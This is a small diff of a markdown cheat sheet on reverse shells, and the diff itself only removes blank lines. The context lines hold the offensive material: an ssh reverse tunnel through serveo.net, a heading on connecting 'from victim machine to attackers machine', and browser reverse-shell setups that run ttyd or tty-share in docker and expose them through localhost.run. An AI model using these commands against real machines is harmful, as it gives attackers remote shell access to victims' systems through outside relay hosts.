@@ -7,7 +7,6 @@
 #### optional - get public address by creating a tcp reverse tunnel
 `ssh -R 443:localhost:443 serveo.net`
 
-
 ## reverse connect from victim machine to attackers machine
 ### bash
 
@@ -22,7 +21,6 @@
 # browser reverse shell - ttyd
 `docker run --rm -p 8080:7681 tsl0922/ttyd`
 `ssh -R 80:localhost:8080 nokey@localhost.run`
-
 
 # browser reverse shell - tty-share
 `docker run --rm -it elisescu/tty-share --public`
